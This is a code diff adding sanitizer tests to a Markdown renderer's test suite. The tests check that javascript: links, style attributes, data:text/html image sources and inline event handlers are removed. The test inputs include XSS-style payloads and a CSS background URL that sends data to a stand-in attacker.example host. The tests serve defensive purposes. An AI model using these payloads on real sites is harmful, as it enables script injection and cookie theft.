@@ -82,12 +82,69 @@ describe("MarkdownRenderer", () => {
     const md = '<a href="javascript:alert(1)">click</a>';
     const { container } = render(<MarkdownRenderer>{md}</MarkdownRenderer>);
     const anchor = container.querySelector("a");
-    // Either the anchor is stripped entirely or its href is dropped — both
-    // are acceptable sanitize outcomes; what's NOT acceptable is keeping
-    // the javascript: URL.
-    if (anchor) {
-      const href = anchor.getAttribute("href");
-      expect(href ?? "").not.toMatch(/^javascript:/i);
+    // Two acceptable sanitize outcomes:
+    //   (1) the anchor is stripped entirely → `anchor === null`,
+    //   (2) the anchor survives but its dangerous href was dropped.
+    // What's NOT acceptable is keeping the javascript: URL. Assert
+    // explicitly in both branches so we never accidentally pass on a
+    // sanitizer that smuggles the link through unmodified by removing
+    // the surrounding wrapper (in which case the `if (anchor)` check
+    // would short-circuit silently).
+    if (anchor === null) {
+      // Sanitizer dropped the anchor entirely — verifiably safe.
+      expect(anchor).toBeNull();
+    } else {
+      expect(anchor.getAttribute("href") ?? "").not.toMatch(/^javascript:/i);
+    }
+  });
+
+  it("does not honor `style` attributes (CSS-injection class of attacks)", () => {
+    // CSS can be a side channel for data exfiltration
+    // (`background-image: url("https://attacker.example/?cookie=…")`) or
+    // for clickjacking/UI redress (`position: fixed; top: 0; …`). Our
+    // schema deliberately omits `style` from the allowed attribute list
+    // so the sanitizer drops it.
+    const md =
+      '<div style="background:url(\'https://attacker.example/exfil\')">x</div>';
+    const { container } = render(<MarkdownRenderer>{md}</MarkdownRenderer>);
+    const div = container.querySelector("div");
+    expect(div).not.toBeNull();
+    // The style attribute must be gone (or at minimum not contain the
+    // attacker URL).
+    expect(div?.getAttribute("style") ?? "").not.toMatch(
+      /attacker\.example/i,
+    );
+    expect(div?.getAttribute("style")).toBeNull();
+  });
+
+  it("blocks data:text/html URLs in img src", () => {
+    // `data:` covers arbitrary mime types, not just images — allowing
+    // it on `<img src>` would let an authored doc round-trip an HTML
+    // document with no schema validation. Our protocol allow-list for
+    // src is restricted to http(s).
+    const md = '<img src="data:text/html,<script>alert(1)</script>" alt="x">';
+    const { container } = render(<MarkdownRenderer>{md}</MarkdownRenderer>);
+    const img = container.querySelector("img");
+    // The sanitizer may either drop src entirely or drop the whole tag —
+    // either way the data:text/html URL must not survive.
+    expect(img?.getAttribute("src") ?? "").not.toMatch(/^data:/i);
+  });
+
+  it("strips other inline event handlers (onerror, onload, onmouseover)", () => {
+    const cases = [
+      '<img src="https://example.com/x.png" onerror="window.__pwn=1">',
+      '<div onmouseover="window.__pwn=1">hover</div>',
+      '<a href="https://example.com" onfocus="window.__pwn=1">link</a>',
+    ];
+    for (const md of cases) {
+      const { container } = render(<MarkdownRenderer>{md}</MarkdownRenderer>);
+      // Whichever tag survived must not carry an on* handler attribute.
+      const element = container.querySelector("img, div, a");
+      if (element) {
+        for (const attr of element.getAttributeNames()) {
+          expect(attr.toLowerCase()).not.toMatch(/^on/);
+        }
+      }
     }
   });
 
